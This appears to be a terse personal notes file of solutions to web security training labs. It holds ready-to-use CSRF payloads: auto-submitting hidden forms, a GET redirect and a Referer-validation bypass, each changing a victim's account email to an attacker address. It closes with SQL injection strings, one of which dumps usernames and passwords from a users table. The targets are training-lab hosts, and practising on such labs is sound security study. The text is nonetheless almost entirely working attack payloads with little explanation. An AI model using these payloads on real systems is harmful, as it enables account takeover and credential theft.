# Bursuip-
CSRF vulnerability with no defenses

</html>
<form  action="https://0a8f00f5041fe6b281d52040007200e1.web-security-academy.net/my-account/change-email" method="post" id="csrf_attack">
    <input type="hidden" name="email" value="attacker@test.com">
</form>
<script>
        document.getElementById("csrf_attack").submit();
</script>
</html>

CSRF where token validation depends on request method

<script>
window.location.href = "https://0a4e00dc03e9b6e481eeee9800fa0067.web-security-academy.net/my-account/change-email?email=attacker@test.com"
</script>

Exploiting CSRF Vulnerabilities and CSRF where token validation depends on token being present


<form action="https://0a7300ae03ef28a182e0337f00a0009f.web-security-academy.net/my-account/change-email" method="post" id="csrf-attack">
    <input type="hidden" name="email" value="attack@attacker.com">
</form>
<script>
    document.getElementById("csrf-attack").submit();
</script>


CSRF with broken Referer validation

HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Referer: https://your-exploit-server.net

<html>
    <head>
        <meta name="referrer" content="unsafe-url">
        <title>CSRF-12</title>
    </head>
    <body>
        <form action="https://0a5a001603618be6806a76fe00da0003.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="attacker@evil.com">
        </form>

        <script>
            history.pushState('', '', '/?0a5a001603618be6806a76fe00da0003.web-security-academy.net')
            document.forms[0].submit();
        </script>
    </body>
</html>





 UNION SELECT NULL
 1 UNION SELECT username || '~' || password FROM users
